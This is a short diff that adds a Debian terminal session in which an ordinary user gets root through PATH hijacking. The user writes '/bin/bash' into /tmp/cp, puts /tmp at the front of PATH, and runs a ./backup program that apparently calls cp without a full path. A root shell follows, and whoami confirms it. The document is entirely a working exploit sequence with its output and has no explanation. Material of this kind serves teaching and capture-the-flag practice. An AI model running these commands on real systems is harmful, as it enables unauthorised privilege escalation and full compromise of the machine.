@@ -1,0 +1,20 @@
+usuario@debian:∼/secret$ which cp
+/bin/cp
+
+usuario@debian:∼/secret$ echo "/bin/bash" > /tmp/cp
+
+usuario@debian:∼/secret$ chmod +x /tmp/cp
+
+usuario@debian:∼/secret$ export PATH=/tmp:$PATH
+
+usuario@debian:∼/secret$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+usuario@debian:∼/secret$ which cp
+/tmp/cp
+
+usuario@debian:∼/secret$ ./backup
+
+root@debian:∼/secret$ whoami
+
+root
